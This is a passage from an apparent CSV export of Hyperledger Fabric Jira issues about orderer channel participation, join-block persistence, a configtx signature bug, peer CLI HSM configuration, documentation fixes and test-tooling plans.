",,pandrejko,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17957,FAB-6815,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cs3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,tatsu-sato,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Jun/20 9:08 PM;pandrejko;https://github.com/hyperledger/fabric/pull/1373#event-3408660183;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Signatures for AnchorPeer updates from configtx library invalid due to non-deterministic proto.Marshal,FAB-17959,45211,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,06/Jun/20 4:40 AM,09/Jun/20 3:29 AM,28/Oct/23 3:10 AM,09/Jun/20 3:29 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"Due to the non-deterministic nature of proto.Marshal, the configtx library should marshal the config update once and pass this around for signatures. 

In the current flow, passing around the ConfigUpdate and marshaling it multiple times for various signatures leads to invalid signatures (not 100% of the time but definitely >75%) when working with updates that include anchor peers. ",,wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzo7i",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Jun/20 5:44 AM;wlahti;[https://github.com/hyperledger/fabric-config/pull/28];;;","06/Jun/20 8:17 AM;yacovm;What's so special about anchor peers though? Don't we have a bunch of maps in the config anyway?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
A file repo for join-blocks,FAB-17960,45212,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,tock,tock,07/Jun/20 4:05 PM,10/Jul/20 6:33 AM,28/Oct/23 3:10 AM,10/Jul/20 6:33 AM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"When an orderer is joined to a channel with the channel-participation API, it is given a join-block, which is the last config block of the channel, given to it by the admin invoking the API. In order to make the ""join"" resistant to crash-restart, the join-block need to be persisted somewhere. Currently there is no mechanisms to do so. 

In this task we build a file repository for atomically storing join-blocks.

Allocate a folder for the orderer join blocks, defined in `orderer.yaml`. 
For example, next to
`WALDir`: `/var/hyperledger/production/orderer/etcdraft/wal`, 
say `JoinBlockDir`: `/var/hyperledger/production/orderer/join-block`.

The orderer will then:
# On a channel join, atomically save the join-block first, before calling GetOrCreate() on the ledger factory, and
# On recovery/startup, will scan the folder as it initializes the channels, to determine what is the join status of every chain.

In order to save the file atomically we will: 
# Create a transient file
# Once written, atomically move it to the persisted location.  

On startup:
# Cleanup the transient files, and 
# Load a list of persisted ones.  

The API for this component would be:

// Open the directory, remove transient files
New(location string, options Options) (*Repo, err)

where Options carry the file suffix (e.g. "".join-block""), the transient file prefix (e.g. ""~"").

// Atomically the content to the channelName+suffix file
(r *Repo) Save(channelName string, content []byte) error

// Scan the directory and produce a list of file names, filter by suffix
(r *Repo) Scan() []string

// Strip the suffix from the file name to get channel name
(r *Repo) FileToChannelName(fileName string) string

// Load file content
(r *Repo) Load(fileName string) ([]byte, error)


Ideally, this will be general enough to be useful for other components as well.",,caod,guoger,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ct7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,guoger,tock,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Jul/20 5:04 PM;guoger;[~caod] could you clarify a bit on why we need join to be crash-resistant? isn't this operation idempotent, so admin could resubmit join-block if previous attempt failed half-way? thx;;;","02/Jul/20 10:44 PM;caod;[~guoger] this simply allows a path around having to resubmit the join-block and quickly starts the onboarding process again once the orderer restarts. Also the file repo can be used for removes as well and will also be used for the file ledger resource removal too. Furthermore if the ledger has been created already, the API will reject the same submission until it's been removed.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Start a consenter w/o InactiveChainRegistry,FAB-17961,45213,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,07/Jun/20 4:40 PM,18/Jun/20 4:07 PM,28/Oct/23 3:10 AM,18/Jun/20 4:07 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"When there is no system channel, we should start a consenter without the  InactiveChanRegistry and associated go-routine.

This should happen also when the orderer starts without channels at all - we assume it is going to be a cluster-type consensus in this case.

This task mainly involves some refactoring of server/main.go and the etcdraft consenter.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ctf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Perform Qscc command with cli returns garbled result,FAB-17962,45214,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,xiongweigang,xiongweigang,08/Jun/20 11:08 AM,09/Jun/20 10:17 AM,28/Oct/23 3:10 AM,09/Jun/20 12:32 AM,v1.4.1,v1.4.6,,,,,,,,,,,,fabric-cli,fabric-peer,,,,,,,,0,quality,,,,,"I set up a BYFN and tried to call the QSCC command using the command line.

peer chaincode query -C mychannel -n qscc -c '\{""Args"":[""GetChainInfo"",""mychannel""]}'

I found that the result returned was messy code.

!image-2020-06-08-10-07-47-959.png!

I then called several other QSCC commands

(include GetBlockByNum, GetBlockByHash) and found the same problem, but the node log does not report any errors, everything is fine, and the status code returned is also 200

Is there something wrong, or is it just the way it was designed",,sykesm,xiongweigang,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Jun/20 11:07 AM;xiongweigang;image-2020-06-08-10-07-47-959.png;https://jira.hyperledger.org/secure/attachment/18348/image-2020-06-08-10-07-47-959.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ctn:",,,,Unset,Unset,,"1. Set up a byfn network
cd fabric-samples/first-network
2. Enter a cli container
docker exec -it cli bash
3. Call the QSCC command
peer chaincode query -C mychannel -n qscc -c '{""Args"":[""GetChainInfo"",""mychannel""]}'",,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,xiongweigang,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Jun/20 12:32 AM;sykesm;When you use chaincode query, the response comes back as a proto encoded response. If you want to see a JSON representation, you can use `peer channel getinfo`.

https://hyperledger-fabric.readthedocs.io/en/release-2.0/commands/peerchannel.html#peer-channel-getinfo-example;;;","09/Jun/20 10:17 AM;xiongweigang;I see. I tried it as you said and got the result I wanted. Thank you very much, you are such a good man!  :D;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Validate join-block,FAB-17963,45218,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,tock,tock,08/Jun/20 6:28 PM,22/Jun/20 10:38 PM,28/Oct/23 3:10 AM,22/Jun/20 10:38 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"* Make sure the join block does not crash the orderer, 
* Make sure it has the minimal set of config groups to be usable.",,caod,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cuj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tock,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"13/Jun/20 3:10 AM;caod;[https://github.com/hyperledger/fabric/pull/1393];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Stop Chains upon removal, clear resources (synchronous)",FAB-17964,45219,40571,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,08/Jun/20 9:59 PM,18/Aug/20 4:21 AM,28/Oct/23 3:10 AM,18/Aug/20 4:21 AM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"Stop the chain, then remove file ledger resources.

The removal of file ledger resources is when we persist the channel.remove marker file in the file repo.

If the orderer crashes before removal is finished, then either the marker was written, so we'll recover and complete the removal, or the chain will resume normal operation after restart.

Note: the etcdraft.Chain triggers the creation of a follower.Chain when Halt() is called. In order to stop the chain before removal this must be changed.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cur:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove the system channel from a network with channels,FAB-17965,45220,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,08/Jun/20 10:00 PM,13/Sep/20 7:58 AM,28/Oct/23 3:10 AM,13/Sep/20 7:58 AM,,,,,,,,,,v2.3.0,,,,fabric-orderer,,,,,,,,,0,ipm,,,,,"Allow a network running with a system channel to migrate and start operate with out it. The flow for doing so is:
 * Enable the channel participation API on all OSNs (a staggered restart of all OSNs is required).
 * Put the system channel into maintenance mode in order to prevent channel creation when it is removed, resulting in inconsistencies across orderers.
 * Remove the system channel with the channel participation API.
 * Prevent config transactions that change orderer channel membership on app channels, to avoid triggering a transition from Inactive <-> Raft 
 ** A simple option is to Halt all the channels, and
 ** Halt the InactiveChainRegistry
 * Removal should remove also all the channels the orderer is not a member of
 * Restart every chain (or restart the server), in order to recreat the chains and convert every chain and its haltCalback pointers from Raft+Inactive to Raft+Follower
 * Normal activity may resume",,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15712,,,,,,,,,,,,,,,,FAB-18131,,,FAB-18230,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17712,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzohfoi",,,,Unset,Unset,,(Please add steps to reproduce),3.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Aug/20 12:21 AM;wlahti;Mostly finished draft PR: [https://github.com/hyperledger/fabric/pull/1817] Just need to think about the appropriate locking a bit further.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Integration tests for channel participation API,FAB-17966,45221,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tock,tock,08/Jun/20 10:05 PM,17/Nov/20 10:56 PM,28/Oct/23 3:10 AM,17/Nov/20 10:56 PM,,,,,,,,,,v2.3.0,,,,fabric-orderer,,,,,,,,,0,,,,,,"Integration tests for the channel participation API.
 - Create test helpers that create and invoke REST API calls on server.  (/)

*Test cases*

With a system channel:
 * Test list, list all, of network with system channel, w solo/kafka/ & raft. On raft: with multiple orderers & multiple channels, not all orderers on all channels. (/)
 * Test the negatives of a network with a system channel - cannot join, cannot delete an app channel.   (/)

Without a system channel (raft only):
 * Test join: as member, follower, with & without on-boarding.   (/)
 * Test join: switch between member & follower and vise versa.   (/)
 * Test remove: remove app channels. Add and remove same channel multiple times.  (/)
 * Remove a channel from an orderer and join it back again to the same orderer. (/)
 * Verify the effects of join & remove with list & list all   (/)

Test crash fault tolerance:
 * On-boarding: when the orderer crashes before the follower reaches the join-block (i.e. before it was deleted from the file repo) (/)
 * Following: when the orderer crashes after the follower reaches the join-block (i.e. it was already deleted form the file repo) (/)
 * Remove: orderer crashes while removing a (big) channel (i.e. before removing the marker form the file repo - not sure how to crash the orderer in the right time for this...)

Transitions between system-channel-style & API style
 * Test create system channel on empty network, continue to create channels the old way. (/)
 * Test removal of system channel on a network with channels, continue to manage with channel participation API.  (/)",,tock,,,,,,,,,,,,,,,,,,,,,FAB-18126,FAB-18127,FAB-18010,FAB-18128,FAB-18129,FAB-18130,FAB-18293,FAB-18149,FAB-18148,,,,,,,,,,,,,,,,,,,,FAB-18274,FAB-18319,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17712,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzohfq",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Contributing guides language translators ,FAB-17967,45222,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,odowdaibm,odowdaibm,odowdaibm,08/Jun/20 10:17 PM,04/Dec/20 4:48 AM,28/Oct/23 3:10 AM,04/Dec/20 4:48 AM,v2.1.0,,,,,,,,,v2.1.1,,,,fabric-docs,,,,,,,,,0,,,,,,"Updates to topics to make it easier for writers and information developers to contribute to the Fabric documentation in all languages.

Affects the following topics:
 * Contributions Welcome! topic (updated)
 * Making a documentation change (new)
 * International languages (new)
 * Contributing documentation (new)
 * Style guide (updated)

 ",,odowdaibm,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cvf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),odowdaibm,pandrejko,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-2.1,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Jun/20 10:19 PM;odowdaibm;Hello [~pandrejko] and [~joe-alewine] .  I've created this for reference in the PR I'm about to submit.  Nothing controversial as you can see – I'd like to make available quite quickly, as we have multiple teams wanting to get started with translations, and it helps having a documented process for this.  Thanks, Anthony.;;;","04/Dec/20 4:48 AM;pandrejko;Done. [https://hyperledger-fabric.readthedocs.io/en/latest/github/github.html?highlight=Git%20]

Thank you Anthony.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Export couchdb data in binary JSON format,FAB-17968,45223,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,manish-sethi,manish-sethi,08/Jun/20 10:58 PM,05/Oct/20 10:17 PM,28/Oct/23 3:10 AM,05/Oct/20 10:17 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"In the current code for exporting the couchdb state data, JSON data is exported in string human readable format. However, since the snapshot data files are not meant to be human readable, we can make this efficient by exporting the data in the binary JSON format. This adds efficiency in both during the export and later during the import at the time of bootstrapping the channel.",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cvn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Oct/20 10:17 PM;manish-sethi;For the first version, we decided to keep the export format common across leveldb and couchdb. If in the future, we want to improve the import performance, we can revisit this. So, closing this task for now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot enable HSM for peer CLI with environment variables,FAB-17969,45224,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,sstone1,sstone1,09/Jun/20 12:00 AM,26/Oct/22 3:40 AM,28/Oct/23 3:10 AM,25/Oct/22 10:11 AM,v2.2.0,,,,,,,,,v1.4.10,v2.2.2,v2.3.0,,fabric-crypto,,,,,,,,,0,operator,,,,,"According to this documentation: [https://hyperledger-fabric.readthedocs.io/en/release-2.0/hsm.html]

You should be able to enable the use of HSM by setting the following environment variables:
{noformat}
CORE_PEER_BCCSP_DEFAULT=PKCS11 CORE_PEER_BCCSP_PKCS11_LIBRARY=/etc/hyperledger/fabric/libsofthsm2.so CORE_PEER_BCCSP_PKCS11_PIN=71811222
CORE_PEER_BCCSP_PKCS11_LABEL=fabric{noformat}
 
 This works in Fabric v1.4.7 but does not work in master.

Looking at changes that might have caused this, FAB-15951 looks like a good candidate: [https://github.com/hyperledger/fabric/commit/4f7e4755fa7abc0d49a479e795923b587272cba4]

It calls factory.GetDefault() very early on, before factory.InitFactories() is called. This results in the ""boot BCCSP"" (SW) being used and then being passed into the commands. You can see this in the log messages:
{noformat}
2020-06-08 15:53:45.200 BST [bccsp] GetDefault -> DEBU 001 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.
2020-06-08 15:53:45.212 BST [bccsp] GetDefault -> DEBU 002 Before using BCCSP, please call InitFactories(). Falling back to bootBCCSP.{noformat}
(Side note, if you want to enforce call orders like that, maybe it should be a panic instead of a debug level log message?)

The end result is that the SW implementation is used instead of PKCS11, and failures occur later on as there are no private keys in the file system for the SW implementation to use.

[~sykesm] [~dereckluo] could you take a look please?",,denyeart,sstone1,tsharris,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18168,,,,,,FAB-17900,FAB-18324,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzohfprw",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,sstone1,tsharris,wlahti,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.2,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Sep/20 9:09 PM;tsharris;https://github.com/hyperledger/fabric/pull/1900;;;","30/Sep/20 11:38 PM;wlahti;Note: check if docs mention that the keys must exist in the yaml config to override with environment variables and add this to docs if not;;;","05/Oct/20 10:41 PM;wlahti;Backported to release-2.2 (already merged) and release-1.4 (not yet merged) branches. Should be available in v2.2.2 and v1.4.10.;;;","16/Oct/20 2:36 AM;wlahti;Still waiting for review on release-1.4. Unclear if this will make it for the upcoming 1.4.10 or if it will be in a subsequent fixpack.;;;","11/Nov/20 2:59 AM;denyeart;The PRs have been reverted due to other negative impacts. We'll need to try again.;;;","25/Oct/22 10:10 AM;denyeart;Resolved in [https://github.com/hyperledger/fabric/pull/3697]

Backported to v2.4.7.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Statement syntax problem in documents,FAB-17970,45227,,Bug,Returned,FAB,Fabric,software,denyeart,,,Medium,,xiongweigang,xiongweigang,xiongweigang,09/Jun/20 12:10 PM,02/Jul/20 12:43 PM,28/Oct/23 3:10 AM,,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-docs,,,,,,,,,0,Documentation,,,,,"In the file docs/wrappers/peer_channel_postscripts，the statement ""The configuration update transaction required to create this channel is defined the file `./createchannel.tx`."" seems to be a grammatical error. Maybe ""The configuration update transaction required to create this channel is contained in the file `./createchannel.tx`."" would be better ?",,xiongweigang,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No, 8bcdaf64edee953caba3c6c85e83c9adf077a5b1,Unset,No,,,"1|i01cwj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),xiongweigang,,,,,,,,,,,,,,release-2.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"10/Jun/20 12:45 PM;xiongweigang;This problem has been solved. Is there anyone who can help me to close it? Thank you!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Modify and Extend Upgrade Scenario,FAB-17971,45232,,Task,Closed,FAB,Fabric,software,denyeart,,,High,Done,suryalnvs,btl5037,btl5037,10/Jun/20 11:28 AM,11/Jan/21 1:34 AM,28/Oct/23 3:10 AM,11/Jan/21 1:34 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Today we execute the upgrade test by going from 1.4 -> 2.0 -> 2.1

We need to update the test to perform two scenarios:
 * 1.4 -> 2.0 -> 2.1 -> 2.2
 * 1.4 -> 2.2

Of note is that the 1.4 -> 2.2 upgrade will no longer require the user to drop the database when using couchdb. If the upgrade scenario doesn't use couchDB, it should be modified to us couch.

This test should be modified to run daily and only executed on the master branch.

Acceptance criteria: A daily job runs two upgrades scenarios, one to across all releases since the last LTS release, and one that runs from the last LTS directly to the newest LTS.",,btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwb9",,,,Unset,Unset,In Progress,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Jun/20 12:10 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/210;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stop Testing Branches Other Than Master,FAB-17972,45233,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,10/Jun/20 11:34 AM,11/Jan/21 3:06 AM,28/Oct/23 3:10 AM,11/Jan/21 3:06 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Now that our LTS strategy states we will not backport breaking changes to prior releases, we will stop performing automated daily tests on branches prior to our current master.

We should disable the daily/weekly test suites for these branches by removing the CRON entry in the pipeline definition files. This does not include nightly publishing jobs.

I'll note that a user can simply navigate to Azure DevOp's to trigger the tests should the need arise.

This will allow us to focus efforts towards ongoing and future work, rather than monitoring old releases and backporting changes.

Acceptance criteria: No nightly tests execute on branches outside of master.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191g:r",,,,Unset,Unset,To Do,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Convert PTE to the High Level Node SDK,FAB-17973,45234,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,dongming,btl5037,btl5037,10/Jun/20 11:40 AM,11/Jan/21 3:10 AM,28/Oct/23 3:10 AM,11/Jan/21 3:10 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"PTE is written using the fabric-common package, which is the low-level SDK. Now that the high-level SDK exists and that is the area of focus for future development, PTE should be modified to use the high-level SDK.

Instead of attempting to modify the existing PTE, the rewrite should be a copy and sit in a folder next to PTE (maybe PTEv2) for now. Development will be incremental, code should be pushed frequently, and reviewed and merged frequently, rather than pushing an entire rewrite of the codebase in single commit series.

We should open tasks around each component of PTE we need to implement.

Acceptance criteria: I can run all E2E system tests using the high-level SDK.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,PTEv2,In Progress,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2qr",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Recreate PTE Using Go SDK,FAB-17974,45235,,Epic,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,dongming,btl5037,btl5037,10/Jun/20 11:45 AM,29/Mar/21 12:49 PM,28/Oct/23 3:10 AM,11/Jan/21 3:10 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The Go SDK has officially released beta support for the new high level programming model. Now that this is available we should consider creating a Go-based tool for performing network operation and testing purposes.

The Operator tooling is written in Go, as well as Fabric itself. To make use of the larger fabric ecosystem, it now makes sense to write a tool for drive traffic and operations in Go. This tooling will be a part of the larger Operator ecosystem.

This story will encapsulate all of the necessary work to create a Go PTE.

Acceptance criteria: I can run E2E system tests purely using Go.
 
